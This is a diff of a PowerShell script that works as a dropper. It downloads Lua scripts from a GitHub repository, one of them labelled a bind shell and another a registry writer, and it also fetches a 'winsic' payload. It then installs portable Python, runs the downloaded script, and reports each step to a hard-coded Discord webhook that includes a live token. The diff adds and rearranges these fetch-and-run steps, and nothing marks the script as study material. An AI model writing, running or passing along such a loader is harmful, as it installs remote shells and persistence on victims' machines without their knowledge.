@@ -8,18 +8,26 @@ $bindshellScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/b
 $regwriteScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/regwrite.lua"
 $extraScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/main.lua"
 $requirementsUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/requirements.txt"  # Replace with actual URL
-$ghostConfigPyUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/winsic.exe"
+$ghostConfigPyUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/winsic.py"
+# Download Lua scripts
+$bindshellScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/bin.lua"
+$regwriteScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/regwrite.lua"
+$extraScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/main.lua"
 $bindshellScriptPath = "$baseDir\bin.lua"
 $regwriteScriptPath = "$baseDir\regwrite.lua"
 $extraScriptPath = "$baseDir\main.lua"
 $requirementsPath = "$baseDir\requirements.txt"
-$ghostConfigPyPath = "$baseDir\winsic.exe"
+$ghostConfigPyPath = "$baseDir\winsic.py"
 $discordWebhookUrl = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
 $luaJitPath = "$baseDir\LuaJIT-2.1"
 $luaPathDir = "$baseDir\Luapath"
 $jitDir = "$luaPathDir\src\jit"
 $srcDir = "$luaPathDir\src"
 $jitSourceDir = "$luaJitPath\src\jit"
+# Define Python installation and environment variables
+$pythonVersion = "3.11.5"
+$pythonDir = "$baseDir\PythonPortable"
+$venvDir = "$baseDir\venv"
 
 # Function to send messages to Discord webhook
 function Send-DiscordMessage {
@@ -204,11 +212,6 @@ Copy-File -Source "$jitSourceDir\*.c" -Destination "$srcDir\"
 Copy-File -Source "$jitSourceDir\*.h" -Destination "$srcDir\"
 Copy-File -Source "$jitSourceDir\*.cpp" -Destination "$srcDir\"
 
-# Download Lua scripts
-$bindshellScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/bin.lua"
-$regwriteScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/regwrite.lua"
-$extraScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/main.lua"
-
 if (-not (Test-Path -Path $bindshellScriptPath)) {
     Get-File -url $bindshellScriptUrl -destination $bindshellScriptPath
 }
@@ -231,10 +234,6 @@ if (-not (Test-Path -Path $ghostConfigPyPath)) {
     Get-File -url $ghostConfigPyUrl -destination $ghostConfigPyPath
 }
 
-# Define Python installation and environment variables
-$pythonVersion = "3.11.5"
-$pythonDir = "$baseDir\PythonPortable"
-$venvDir = "$baseDir\venv"
 
 # Download Portable Python
 Send-DiscordMessage -message "Downloading Portable Python..."
@@ -264,12 +263,9 @@ Send-DiscordMessage -message "Installing virtualenv..."
 Send-DiscordMessage -message "Creating virtual environment..."
 & "$pythonDir\python.exe" -m virtualenv $venvDir
 
-Send-DiscordMessage -message "Activating virtual environment..."
-& "$venvDir\Scripts\activate.bat"
-
 Send-DiscordMessage -message "Installing dependencies from requirements.txt..."
 if (Test-Path -Path $requirementsPath) {
-    & "$venvDir\Scripts\pip.exe" install -r $requirementsPath
+    & "$venvDir\Scripts\python.exe" -m pip install -r $requirementsPath
 } else {
     Send-DiscordMessage -message "No requirements.txt found, skipping dependency installation."
 }
@@ -279,3 +275,4 @@ Send-DiscordMessage -message "Running the Python script..."
 & "$venvDir\Scripts\python.exe" $ghostConfigPyPath
 
 Send-DiscordMessage -message "All steps completed."
+
